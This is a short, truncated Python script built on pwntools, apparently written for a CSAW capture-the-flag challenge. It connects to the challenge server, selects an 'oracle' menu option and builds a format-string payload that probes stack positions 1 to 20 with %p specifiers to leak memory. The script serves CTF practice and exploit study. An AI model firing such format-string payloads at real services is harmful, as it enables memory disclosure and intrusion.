from pwn import *

def test_format_string():
    try:
        # Set up connection
        p = remote('pwn.chal.csaw.io', 6666, level='error')

        # Select oracle (option 6)
        p.sendlineafter(b'Choice:', b'6')

        # Create format string payload
        payload = b'MARK'
        for i in range(1, 21):  # Test positions 1-20
            payload += f'.%{i}$p'.encode()

